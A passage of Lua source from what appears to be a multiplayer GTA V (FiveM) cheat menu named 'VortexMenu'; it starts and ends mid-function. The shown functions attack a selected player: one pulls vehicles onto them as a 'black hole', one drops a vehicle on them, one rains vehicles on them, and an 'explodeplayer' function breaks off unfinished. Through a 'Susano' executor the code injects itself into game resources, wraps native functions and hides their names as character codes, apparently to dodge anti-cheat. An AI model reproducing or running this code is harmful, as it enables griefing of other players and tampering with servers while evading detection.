                        timeout = timeout + 1
                    end

                    local groundZ = myCoords.z
                    local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
                    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
                    if hit then
                        groundZ = hitCoords.z
                    end

                    local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
                    SetEntityCollision(clonePed, false, false)
                    FreezeEntityPosition(clonePed, true)
                    SetEntityInvincible(clonePed, true)
                    SetBlockingOfNonTemporaryEvents(clonePed, true)
                    SetPedCanRagdoll(clonePed, false)
                    ClonePedToTarget(playerPed, clonePed)

                    SetEntityVisible(playerPed, false, false)

                    local emptyVehicles = {}
                    local searchRadius = 1000.0
                    local vehHandle, veh = FindFirstVehicle()
                    local success

                    repeat
                        local vehCoords = GetEntityCoords(veh)
                        local distance = #(myCoords - vehCoords)
                        local vehClass = GetVehicleClass(veh)
                        local driver = GetPedInVehicleSeat(veh, -1)
                        local isEmpty = (driver == 0 or not DoesEntityExist(driver))

                        if distance <= searchRadius and veh ~= GetVehiclePedIsIn(playerPed, false) and vehClass ~= 8 and vehClass ~= 13 and isEmpty then
                            table.insert(emptyVehicles, {handle = veh, distance = distance})
                        end

                        success, veh = FindNextVehicle(vehHandle)
                    until not success

                    EndFindVehicle(vehHandle)

                    if #emptyVehicles == 0 then
                        SetEntityVisible(playerPed, true, false)
                        SetCamActive(blackHoleCam, false)
                        RenderScriptCams(false, false, 0, true, true)
                        DestroyCam(blackHoleCam, true)
                        if DoesEntityExist(clonePed) then
                            DeleteEntity(clonePed)
                        end
                        SetModelAsNoLongerNeeded(playerModel)
                        _G.black_hole_active = false
                        return
                    end

                    table.sort(emptyVehicles, function(a, b) return a.distance < b.distance end)

                    for i, vehData in ipairs(emptyVehicles) do
                        local veh = vehData.handle
                        if DoesEntityExist(veh) and _G.black_hole_active then
                            SetPedIntoVehicle(playerPed, veh, -1)
                            Wait(150)

                            SetEntityAsMissionEntity(veh, true, true)
                            if NetworkGetEntityIsNetworked(veh) then
                                NetworkRequestControlOfEntity(veh)
                                local timeout = 0
                                while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                                    NetworkRequestControlOfEntity(veh)
                                    Wait(10)
                                    timeout = timeout + 1
                                end
                            end

                            SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                            SetEntityHeading(playerPed, myHeading)
                            Wait(50)
                        end
                    end

                    SetEntityVisible(playerPed, true, false)
                    SetCamActive(blackHoleCam, false)
                    RenderScriptCams(false, false, 0, true, true)
                    DestroyCam(blackHoleCam, true)
                    if DoesEntityExist(clonePed) then
                        DeleteEntity(clonePed)
                    end
                    SetModelAsNoLongerNeeded(playerModel)

                    _G.black_hole_vehicles = emptyVehicles
                end)

                CreateThread(function()
                    while not _G.black_hole_vehicles or #_G.black_hole_vehicles == 0 do
                        if not _G.black_hole_active then
                            return
                        end
                        Wait(100)
                    end

                    while true do
                        Wait(100)

                        if not _G.black_hole_active then
                            break
                        end

                        local targetPlayerId = _G.black_hole_target_player
                        if not targetPlayerId then
                            _G.black_hole_active = false
                            break
                        end

                        local targetPed = GetPlayerPed(targetPlayerId)
                        if not DoesEntityExist(targetPed) then
                            _G.black_hole_active = false
                            break
                        end

                        local currentTargetCoords
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)

                        if targetVehicle and targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
                            currentTargetCoords = GetEntityCoords(targetVehicle)
                        else
                            currentTargetCoords = GetEntityCoords(targetPed)
                        end

                        local vehicles = _G.black_hole_vehicles or {}

                        local currentTime = GetGameTimer()
                        if not _G.black_hole_last_scan or (currentTime - _G.black_hole_last_scan) > 2000 then
                            _G.black_hole_last_scan = currentTime

                            local searchRadius = 1000.0
                            local vehHandle, veh = FindFirstVehicle()
                            local success
                            local existingVehicleHandles = {}

                            for _, vehData in ipairs(vehicles) do
                                if DoesEntityExist(vehData.handle) then
                                    existingVehicleHandles[vehData.handle] = true
                                end
                            end

                            repeat
                                if DoesEntityExist(veh) then
                                    local vehCoords = GetEntityCoords(veh)
                                    local distance = #(currentTargetCoords - vehCoords)
                                    local vehClass = GetVehicleClass(veh)
                                    local driver = GetPedInVehicleSeat(veh, -1)
                                    local isEmpty = (driver == 0 or not DoesEntityExist(driver))

                                    if not existingVehicleHandles[veh] and distance <= searchRadius and veh ~= targetVehicle and vehClass ~= 8 and vehClass ~= 13 and isEmpty then
                                        table.insert(vehicles, {handle = veh, distance = distance})
                                        existingVehicleHandles[veh] = true
                                    end
                                end

                                success, veh = FindNextVehicle(vehHandle)
                            until not success

                            EndFindVehicle(vehHandle)

                            _G.black_hole_vehicles = vehicles
                        end

                        for _, vehData in ipairs(vehicles) do
                            local veh = vehData.handle
                            if DoesEntityExist(veh) then
                                if veh ~= targetVehicle then
                                    local vehCoords = GetEntityCoords(veh)
                                    local directionX = currentTargetCoords.x - vehCoords.x
                                    local directionY = currentTargetCoords.y - vehCoords.y
                                    local directionZ = currentTargetCoords.z - vehCoords.z

                                    local distance = math.sqrt(directionX * directionX + directionY * directionY + directionZ * directionZ)

                                    if distance > 2.0 then
                                        local normX = directionX / distance
                                        local normY = directionY / distance
                                        local normZ = directionZ / distance

                                        local attractionForce = math.min(50.0, 1000.0 / math.max(distance, 1.0))

                                        SetEntityVelocity(veh, normX * attractionForce, normY * attractionForce, normZ * attractionForce)
                                    else
                                        SetEntityVelocity(veh, 0.0, 0.0, 0.0)
                                    end
                                end
                            end
                        end
                    end
                end)
            ]], targetServerId))
        else
            local currentState = rawget(_G, 'black_hole_active') or false

            if currentState then
                rawset(_G, 'black_hole_active', false)
                rawset(_G, 'black_hole_vehicles', {})
                rawset(_G, 'black_hole_target_player', nil)
                return
            end

            if not VortexMenu.selectedPlayer then
                return
            end

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then
                vortex_blackholeEnabled = false
                return
            end

            Citizen.CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)
                local myHeading = GetEntityHeading(playerPed)

                rawset(_G, 'black_hole_active', true)
                rawset(_G, 'black_hole_vehicles', {})
                rawset(_G, 'black_hole_target_player', targetPlayerId)

                local blackHoleCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                local camCoords = GetGameplayCamCoord()
                local camRot = GetGameplayCamRot(2)
                SetCamCoord(blackHoleCam, camCoords.x, camCoords.y, camCoords.z)
                SetCamRot(blackHoleCam, camRot.x, camRot.y, camRot.z, 2)
                SetCamFov(blackHoleCam, GetGameplayCamFov())
                SetCamActive(blackHoleCam, true)
                RenderScriptCams(true, false, 0, true, true)

                local playerModel = GetEntityModel(playerPed)
                RequestModel(playerModel)
                local timeout = 0
                while not HasModelLoaded(playerModel) and timeout < 50 do
                    Citizen.Wait(50)
                    timeout = timeout + 1
                end

                local groundZ = myCoords.z
                local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
                local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
                if hit then
                    groundZ = hitCoords.z
                end

                local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
                SetEntityCollision(clonePed, false, false)
                FreezeEntityPosition(clonePed, true)
                SetEntityInvincible(clonePed, true)
                SetBlockingOfNonTemporaryEvents(clonePed, true)
                SetPedCanRagdoll(clonePed, false)
                ClonePedToTarget(playerPed, clonePed)

                SetEntityVisible(playerPed, false, false)
                SetEntityLocallyInvisible(playerPed)

                local emptyVehicles = {}
                local searchRadius = 1000.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    local driver = GetPedInVehicleSeat(veh, -1)
                    local isEmpty = (driver == 0 or not DoesEntityExist(driver))

                    if distance <= searchRadius and veh ~= GetVehiclePedIsIn(playerPed, false) and vehClass ~= 8 and vehClass ~= 13 and isEmpty then
                        table.insert(emptyVehicles, {handle = veh, distance = distance})
                    end

                    success, veh = FindNextVehicle(vehHandle)
                until not success

                EndFindVehicle(vehHandle)

                if #emptyVehicles == 0 then
                    SetEntityVisible(playerPed, true, false)
                    SetCamActive(blackHoleCam, false)
                    if not rawget(_G, 'isSpectating') then
                        RenderScriptCams(false, false, 0, true, true)
                    end
                    DestroyCam(blackHoleCam, true)
                    if DoesEntityExist(clonePed) then
                        DeleteEntity(clonePed)
                    end
                    SetModelAsNoLongerNeeded(playerModel)
                    rawset(_G, 'black_hole_active', false)
                    return
                end

                table.sort(emptyVehicles, function(a, b) return a.distance < b.distance end)

                for i, vehData in ipairs(emptyVehicles) do
                    local veh = vehData.handle
                    if DoesEntityExist(veh) and rawget(_G, 'black_hole_active') then
                        SetPedIntoVehicle(playerPed, veh, -1)
                        Citizen.Wait(150)

                        SetEntityAsMissionEntity(veh, true, true)
                        if NetworkGetEntityIsNetworked(veh) then
                            NetworkRequestControlOfEntity(veh)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                                NetworkRequestControlOfEntity(veh)
                                Citizen.Wait(10)
                                timeout = timeout + 1
                            end
                        end

                        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                        SetEntityHeading(playerPed, myHeading)
                        Citizen.Wait(50)
                    end
                end

                SetEntityVisible(playerPed, true, false)
                SetCamActive(blackHoleCam, false)
                if not rawget(_G, 'isSpectating') then
                    RenderScriptCams(false, false, 0, true, true)
                end
                DestroyCam(blackHoleCam, true)
                if DoesEntityExist(clonePed) then
                    DeleteEntity(clonePed)
                end
                SetModelAsNoLongerNeeded(playerModel)

                rawset(_G, 'black_hole_vehicles', emptyVehicles)
            end)

            Citizen.CreateThread(function()
                while not rawget(_G, 'black_hole_vehicles') or #rawget(_G, 'black_hole_vehicles') == 0 do
                    if not rawget(_G, 'black_hole_active') then
                        return
                    end
                    Citizen.Wait(100)
                end

                while true do
                    Citizen.Wait(100)

                    if not rawget(_G, 'black_hole_active') then
                        break
                    end

                    local targetPlayerId = rawget(_G, 'black_hole_target_player')
                    if not targetPlayerId then
                        rawset(_G, 'black_hole_active', false)
                        break
                    end

                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then
                        rawset(_G, 'black_hole_active', false)
                        break
                    end

                    local currentTargetCoords
                    local targetVehicle = GetVehiclePedIsIn(targetPed, false)

                    if targetVehicle and targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
                        currentTargetCoords = GetEntityCoords(targetVehicle)
                    else
                        currentTargetCoords = GetEntityCoords(targetPed)
                    end

                    local vehicles = rawget(_G, 'black_hole_vehicles') or {}

                    local currentTime = GetGameTimer()
                    if not rawget(_G, 'black_hole_last_scan') or (currentTime - rawget(_G, 'black_hole_last_scan')) > 2000 then
                        rawset(_G, 'black_hole_last_scan', currentTime)

                        local searchRadius = 1000.0
                        local vehHandle, veh = FindFirstVehicle()
                        local success
                        local existingVehicleHandles = {}

                        for _, vehData in ipairs(vehicles) do
                            if DoesEntityExist(vehData.handle) then
                                existingVehicleHandles[vehData.handle] = true
                            end
                        end

                        repeat
                            if DoesEntityExist(veh) then
                                local vehCoords = GetEntityCoords(veh)
                                local distance = #(currentTargetCoords - vehCoords)
                                local vehClass = GetVehicleClass(veh)
                                local driver = GetPedInVehicleSeat(veh, -1)
                                local isEmpty = (driver == 0 or not DoesEntityExist(driver))

                                if not existingVehicleHandles[veh] and distance <= searchRadius and veh ~= targetVehicle and vehClass ~= 8 and vehClass ~= 13 and isEmpty then
                                    table.insert(vehicles, {handle = veh, distance = distance})
                                    existingVehicleHandles[veh] = true
                                end
                            end

                            success, veh = FindNextVehicle(vehHandle)
                        until not success

                        EndFindVehicle(vehHandle)

                        rawset(_G, 'black_hole_vehicles', vehicles)
                    end

                    for _, vehData in ipairs(vehicles) do
                        local veh = vehData.handle
                        if DoesEntityExist(veh) then
                            if veh ~= targetVehicle then
                                local vehCoords = GetEntityCoords(veh)
                                local directionX = currentTargetCoords.x - vehCoords.x
                                local directionY = currentTargetCoords.y - vehCoords.y
                                local directionZ = currentTargetCoords.z - vehCoords.z

                                local distance = math.sqrt(directionX * directionX + directionY * directionY + directionZ * directionZ)

                                if distance > 2.0 then
                                    local normX = directionX / distance
                                    local normY = directionY / distance
                                    local normZ = directionZ / distance

                                    local attractionForce = math.min(50.0, 1000.0 / math.max(distance, 1.0))

                                    SetEntityVelocity(veh, normX * attractionForce, normY * attractionForce, normZ * attractionForce)
                                else
                                    SetEntityVelocity(veh, 0.0, 0.0, 0.0)
                                end
                            end
                        end
                    end
                end
            end)
        end
    end,

    dropvehicle = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLocked", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLockedForAllPlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityRotation", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVelocity", function(originalFn, ...) return originalFn(...) end)

                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then
                    return
                end

                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then
                    return
                end

                CreateThread(function()
                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local myHeading = GetEntityHeading(playerPed)

                    local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                    if not closestVeh or closestVeh == 0 then
                        return
                    end

                    ClearPedTasksImmediately(playerPed)
                    SetVehicleDoorsLocked(closestVeh, 1)
                    SetVehicleDoorsLockedForAllPlayers(closestVeh, false)

                    if IsVehicleSeatFree(closestVeh, -1) then
                        SetPedIntoVehicle(playerPed, closestVeh, -1)
                    end

                    Wait(150)

                    SetEntityAsMissionEntity(closestVeh, true, true)
                    if NetworkGetEntityIsNetworked(closestVeh) then
                        NetworkRequestControlOfEntity(closestVeh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                            NetworkRequestControlOfEntity(closestVeh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end

                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    SetEntityHeading(playerPed, myHeading)
                    Wait(100)

                    if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then
                        return
                    end

                    local targetCoords = GetEntityCoords(targetPed)
                    SetEntityCoordsNoOffset(closestVeh, targetCoords.x, targetCoords.y, targetCoords.z + 15.0, false, false, false)
                    SetEntityRotation(closestVeh, 0.0, 0.0, 0.0, 2, true)

                    Wait(50)
                    SetEntityVelocity(closestVeh, 0.0, 0.0, -5.0)
                end)
            ]], targetServerId))
        else
        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
            if not closestVeh or closestVeh == 0 then
                return
            end

            ClearPedTasksImmediately(playerPed)
            SetVehicleDoorsLocked(closestVeh, 1)
            SetVehicleDoorsLockedForAllPlayers(closestVeh, false)

            if IsVehicleSeatFree(closestVeh, -1) then
                SetPedIntoVehicle(playerPed, closestVeh, -1)
            end

            Citizen.Wait(150)

            SetEntityAsMissionEntity(closestVeh, true, true)
            if NetworkGetEntityIsNetworked(closestVeh) then
                NetworkRequestControlOfEntity(closestVeh)
                local timeout = 0
                while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                    NetworkRequestControlOfEntity(closestVeh)
                    Citizen.Wait(10)
                    timeout = timeout + 1
                end
            end

            SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
            SetEntityHeading(playerPed, myHeading)
            Citizen.Wait(100)

            if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then
                return
            end

            local targetCoords = GetEntityCoords(targetPed)
            SetEntityCoordsNoOffset(closestVeh, targetCoords.x, targetCoords.y, targetCoords.z + 15.0, false, false, false)
            SetEntityRotation(closestVeh, 0.0, 0.0, 0.0, 2, true)

            Citizen.Wait(50)
            SetEntityVelocity(closestVeh, 0.0, 0.0, -5.0)
        end)
        end
    end,

    rainvehicle = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLocked", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLockedForAllPlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityRotation", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityHasGravity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVelocity", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityVelocity", function(originalFn, ...) return originalFn(...) end)

                local targetServerId = %d
        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

                CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local nearbyVehicles = {}
            local searchRadius = 200.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                if DoesEntityExist(veh) then
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)

                    if distance <= searchRadius and distance > 5.0 and vehClass ~= 8 and vehClass ~= 13 and veh ~= GetVehiclePedIsIn(playerPed, false) then
                        table.insert(nearbyVehicles, veh)
                    end
                end

                success, veh = FindNextVehicle(vehHandle)
            until not success

            EndFindVehicle(vehHandle)

            if #nearbyVehicles == 0 then
                return
            end


            for i, veh in ipairs(nearbyVehicles) do
                if DoesEntityExist(veh) and DoesEntityExist(targetPed) then
                    ClearPedTasksImmediately(playerPed)
                    SetVehicleDoorsLocked(veh, 1)
                    SetVehicleDoorsLockedForAllPlayers(veh, false)

                    if IsVehicleSeatFree(veh, -1) then
                        SetPedIntoVehicle(playerPed, veh, -1)
                    end

                    Wait(100)

                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(veh) and timeout < 30 do
                            NetworkRequestControlOfEntity(veh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end

                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    SetEntityHeading(playerPed, myHeading)
                    Wait(50)

                    if DoesEntityExist(targetPed) and DoesEntityExist(veh) then
                        local targetCoords = GetEntityCoords(targetPed)
                        local heightOffset = 20.0 + (i * 3.0)

                        SetEntityCoordsNoOffset(veh, targetCoords.x, targetCoords.y, targetCoords.z + heightOffset, false, false, false)
                        SetEntityRotation(veh, 0.0, 0.0, 0.0, 2, true)
                        SetEntityHasGravity(veh, true)

                        Wait(50)
                        SetEntityVelocity(veh, 0.0, 0.0, -10.0)

                        CreateThread(function()
                            local vehHandle = veh
                            local maxIterations = 200
                            local iteration = 0

                            while DoesEntityExist(vehHandle) and iteration < maxIterations do
                                Wait(100)
                                iteration = iteration + 1

                                if DoesEntityExist(targetPed) then
                                    local currentTargetCoords = GetEntityCoords(targetPed)
                                    local vehCoords = GetEntityCoords(vehHandle)

                                    if vehCoords.z > currentTargetCoords.z + 2.0 then
                                        local currentVel = GetEntityVelocity(vehHandle)
                                        SetEntityVelocity(vehHandle, 0.0, 0.0, math.min(currentVel.z, -8.0))
                                    else
                                        break
                                    end
                                else
                                    break
                                end
                            end
                        end)
                    end

                    Wait(100)
                end
            end
        end)
            ]], targetServerId))
        else
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then
                return
            end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then
                return
            end

            Citizen.CreateThread(function()
                local playerPed = PlayerPedId()
                local myCoords = GetEntityCoords(playerPed)
                local myHeading = GetEntityHeading(playerPed)

                local nearbyVehicles = {}
                local searchRadius = 200.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    if DoesEntityExist(veh) then
                        local vehCoords = GetEntityCoords(veh)
                        local distance = #(myCoords - vehCoords)
                        local vehClass = GetVehicleClass(veh)

                        if distance <= searchRadius and distance > 5.0 and vehClass ~= 8 and vehClass ~= 13 and veh ~= GetVehiclePedIsIn(playerPed, false) then
                            table.insert(nearbyVehicles, veh)
                        end
                    end

                    success, veh = FindNextVehicle(vehHandle)
                until not success

                EndFindVehicle(vehHandle)

                if #nearbyVehicles == 0 then
                    return
                end

            for i, veh in ipairs(nearbyVehicles) do
                if DoesEntityExist(veh) and DoesEntityExist(targetPed) then
                    ClearPedTasksImmediately(playerPed)
                    SetVehicleDoorsLocked(veh, 1)
                    SetVehicleDoorsLockedForAllPlayers(veh, false)

                    if IsVehicleSeatFree(veh, -1) then
                        SetPedIntoVehicle(playerPed, veh, -1)
                    end

                    Citizen.Wait(100)

                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(veh) and timeout < 30 do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(10)
                            timeout = timeout + 1
                        end
                    end

                    SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                    SetEntityHeading(playerPed, myHeading)
                    Citizen.Wait(50)

                    if DoesEntityExist(targetPed) and DoesEntityExist(veh) then
                        local targetCoords = GetEntityCoords(targetPed)
                            local heightOffset = 20.0 + (i * 3.0)

                        SetEntityCoordsNoOffset(veh, targetCoords.x, targetCoords.y, targetCoords.z + heightOffset, false, false, false)
                        SetEntityRotation(veh, 0.0, 0.0, 0.0, 2, true)
                        SetEntityHasGravity(veh, true)

                        Citizen.Wait(50)
                            SetEntityVelocity(veh, 0.0, 0.0, -10.0)

                        Citizen.CreateThread(function()
                            local vehHandle = veh
                                local maxIterations = 200
                            local iteration = 0

                            while DoesEntityExist(vehHandle) and iteration < maxIterations do
                                Citizen.Wait(100)
                                iteration = iteration + 1

                                if DoesEntityExist(targetPed) then
                                    local currentTargetCoords = GetEntityCoords(targetPed)
                                    local vehCoords = GetEntityCoords(vehHandle)

                                    if vehCoords.z > currentTargetCoords.z + 2.0 then
                                        local currentVel = GetEntityVelocity(vehHandle)
                                        SetEntityVelocity(vehHandle, 0.0, 0.0, math.min(currentVel.z, -8.0))
                                    else
                                        break
                                    end
                                else
                                    break
                                end
                            end
                        end)
                    end

                    Citizen.Wait(100)
                end
            end
        end)
        end
    end,

    explodeplayer = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId or targetPlayerId == -1 then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local targetServerId = VortexMenu.selectedPlayer
            local injectionCode = string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function g(n)
                    local func = _G[decode(n)]
                    if not func then
                        return nil
                    end
                    return func
                end
                local function wait(n)
                    local waitFunc = g({87,97,105,116})
                    if not waitFunc then
                        return
                    end
                    return waitFunc(n)
                end

                local vehicleName = decode({109,97,110,99,104,101,122})
                local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                if not requestModel then return end
                requestModel(vehicleName)

                local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                if hasModelLoaded then
                    local attempts = 0
                    while not hasModelLoaded(vehicleName) and attempts < 20 do
                        wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= 20 then
                        return
                    end
                end

                local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                if not getPlayerFromServerId then return end
                local targetPlayer = getPlayerFromServerId(%d)
                if targetPlayer == -1 then
                    return
                end

                local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                if not getPlayerPed then return end
                local targetPed = getPlayerPed(targetPlayer)
                if not targetPed or targetPed == 0 then
                    return
                end

                local localPlayerPed = getPlayerPed(-1)
                if not localPlayerPed or localPlayerPed == 0 then
                    return
                end

                local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                if not getEntityCoords or not getEntityHeading then return end
                local targetPos = getEntityCoords(targetPed)
                local heading = getEntityHeading(targetPed)

